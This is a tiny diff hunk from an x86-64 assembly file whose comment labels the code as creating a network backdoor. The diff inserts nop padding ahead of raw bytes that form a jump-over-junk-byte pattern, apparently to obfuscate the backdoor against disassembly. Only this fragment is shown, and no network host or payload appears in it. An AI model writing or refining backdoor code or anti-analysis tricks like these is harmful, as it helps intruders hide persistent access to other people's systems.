@@ -48,6 +48,10 @@ _start:
 	;create network backdoor
 	push rax
 	xor rax, rax
+	nop
+	nop
+	nop
+	nop
 	db 0x74
 	db 0x01
 	db 0x0f
